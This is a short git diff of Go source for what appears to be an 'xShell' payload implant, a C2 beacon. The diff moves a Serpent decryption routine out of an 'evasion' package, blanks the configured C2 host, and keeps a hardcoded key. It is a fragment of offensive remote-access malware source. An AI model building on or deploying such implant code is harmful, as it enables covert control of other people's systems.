@@ -5,13 +5,12 @@ import (
 	"io"
 	"os"
 	"time"
-	"xShell/payload/evasion"
 	"xShell/payload/internal"
 )
 
 // TODO: pad keys
 var KeyStr string = "thisismypassword" // must be 16, 24, 32 bytes
-var C2Host string = "http://127.0.0.1"
+var C2Host string = ""
 
 func main() {
 	internal.HttpLink.Host = C2Host
@@ -89,7 +88,7 @@ func getId() (string, error) {
 	if err != nil {
 		return "", err
 	}
-	decrypt, err := evasion.SerpentDecrypt(body, internal.HttpLink.Key)
+	decrypt, err := internal.SerpentDecrypt(body, internal.HttpLink.Key)
 	if err != nil {
 		return "", err
 	}
